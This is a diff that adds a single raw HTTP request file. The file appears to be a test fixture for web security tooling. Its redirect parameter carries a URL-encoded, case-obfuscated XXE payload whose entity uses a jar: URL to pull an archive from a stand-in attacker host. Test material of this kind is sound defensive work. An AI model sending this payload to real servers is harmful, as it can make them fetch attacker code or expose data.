@@ -1,0 +1,4 @@
+GET /a?redirect=<!dOcTyPe%20R%20[<!eNtItY%20x%20SyStEm%20"JaR:hTtP://eViL.tLd/X.jAr!/X">]><r>%26X;</r> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
